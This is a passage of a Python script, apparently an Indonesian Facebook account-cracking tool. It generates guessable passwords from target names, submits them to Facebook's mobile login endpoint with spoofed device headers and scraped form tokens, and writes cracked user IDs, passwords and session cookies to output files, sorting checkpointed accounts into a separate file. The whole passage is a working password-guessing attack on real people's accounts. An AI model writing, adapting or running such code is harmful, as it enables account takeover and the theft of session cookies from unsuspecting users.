						pwx.append(nmf+'123')
						pwx.append(nmf+'321')
					else:
						pwx.append(nmf)
					pwx.append('pemalang')
					pwx.append(frs+'123')
					pwx.append(frs+'1234')
					pwx.append(frs+'12345')
					pwx.append(frs+'123456')
					pwx.append(frs+'321')
					pwx.append(frs+'01')
					pwx.append(frs+'02')
					pwx.append(frs+'03')
					pwx.append(frs+'04')
					pwx.append(frs+'05')
					pwx.append(frs+'06')
					pwx.append(frs+'07')
					pwx.append(frs+'08')
					pwx.append(frs+'09')
					pwx.append(frs+'11')
					pwx.append(frs+'12')
					pwx.append('indonesia')
					
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwx.append(xpwd)
				else:pass
				if 'validate' in method:
				    pool.submit(crackvalidate,idf,pwx)
				else:
					pool.submit(crackvalidate,idf,pwx)
#----------[ METODE-VALIDATE ]----------#	
def crackvalidate(idf,pwx):
	global loop,ok,cp
	bo = random.choice([hijo,KON,biru])
	rc = random.choice
	sys.stdout.write(f"\r[{bo}Yandex{puti}]{puti}[{loop}]{puti}{puti}[{hijo}{len(id)}{puti}][{puti}ok:{puti}{hijo}{ok}{P}][{puti}cp:{puti}{kun}{cp}{P}]{puti}{P}[{bo}{idf}{P}]")
	ses = requests.Session()
	for pw in pwx:
		try:
			rr = random.randint
			ua = rc(ugen)
			ses.headers.update({
            'Host': 'm.facebook.com',
            'cache-control': 'max-age=0',
            'sec-ch-ua-mobile': '?1',
            'upgrade-insecure-requests': '1',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': ua,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-dest': 'document',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
            })
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&api_key=2572246932852997&kid_directed_site=0&app_id=2572246932852997&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv4.0%2Fdialog%2Foauth%3Fapp_id%3D2572246932852997%26cbt%3D1701324889315%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df19ad207fd5edc%2526domain%253Dmyim3app.indosatooredoo.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmyim3app.indosatooredoo.com%25252Ff1fbb9d1d151054%2526relation%253Dopener%26client_id%3D2572246932852997%26display%3Dtouch%26domain%3Dmyim3app.indosatooredoo.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fmyim3app.indosatooredoo.com%252F%2523%252Flogin%26fields%3Dname%252Cemail%252Cpicture%252Cfirst_name%252Clast_name%26locale%3Den_US%26logger_id%3Df1591e23a79190c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df183c91f29c2034%2526domain%253Dmyim3app.indosatooredoo.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmyim3app.indosatooredoo.com%25252Ff1fbb9d1d151054%2526relation%253Dopener%2526frame%253Df3c4e1988fb4ef4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv4.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df183c91f29c2034%26domain%3Dmyim3app.indosatooredoo.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fmyim3app.indosatooredoo.com%252Ff1fbb9d1d151054%26relation%3Dopener%26frame%3Df3c4e1988fb4ef4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={
            "lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
            "jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
            "uid": idf,
            "next": "https://m.facebook.com/v4.0/dialog/oauth?app_id=2572246932852997&cbt=1701324889315&channel_url=https.staticxx.facebook.com&connect=xd_arbiter&version=2523&cb%253Df19ad207fd5edc%2526domain%253Dmyim3app.indosatooredoo.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmyim3app.indosatooredoo.com%25252Ff1fbb9d1d151054%2526relation%253Dopener%26client_id%3D2572246932852997%26display%3Dtouch%26domain%3Dmyim3app.indosatooredoo.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fmyim3app.indosatooredoo.com%252F%2523%252Flogin%26fields%3Dname%252Cemail%252Cpicture%252Cfirst_name%252Clast_name%26locale%3Den_US%26logger_id%3Df1591e23a79190c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df183c91f29c2034%2526domain%253Dmyim3app.indosatooredoo.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmyim3app.indosatooredoo.com%25252Ff1fbb9d1d151054%2526relation%253Dopener%2526frame%253Df3c4e1988fb4ef4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv4.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified",
            "flow": "login_no_pin",
            "pass": pw,
            }
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2; wd=360x648'
			heade={
            'Host': 'm.facebook.com',
            'content-length': '269',
            'cache-control': 'max-age=0',
            'dpr': '2',
            'viewport-width': '980',
            'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"13.0.0"',
            'sec-ch-ua-model': '"RMX3760"',
            'sec-ch-ua-full-version-list': f'"Google Chrome";v="117.0.5938.153", "Not;A=Brand";v="8.0.0.0", "Chromium";v="117.0.5938.153"',
            'sec-ch-prefers-color-scheme': 'dark',
            'upgrade-insecure-requests': '1',
            'origin': 'https://m.facebook.com',
            'content-type': 'application/x-www-form-urlencoded',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': ua,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
            }
			po = ses.post('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki = po.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				print(f"\n[•] User ID: {hijo}{idf}{puti}")
				print(f"[•] Password: {hijo}{pw}{puti}")
				print(f"[•] Tahun: {mer}{tahun(idf)}{puti}")
				print(f"[•] Cookie: {hijo}{kuki}{puti}")
				#print(f"{ua}")
				open('XSHIN-OK/'+'XSHIN-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
				open('XSHIN-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				break			
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f"\n[•] User ID: {kun}{idf}{puti}")
				print(f"[•] Password: {kun}{pw}{puti}")
				print(f"[•] Tahun: {mer}{tahun(idf)}{puti}")
				open('XSHIN-CP/'+'XSHIN-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
				akune.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break	
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	

#----------[ CEK-OPSI ]----------#
#----------[ SYSTEM-CONTROL ]----------#	
if __name__=='__main__':
	try:os.mkdir('XSHIN-OK')
	except:pass
	try:os.mkdir('XSHIN-CP')
	except:pass
	menu()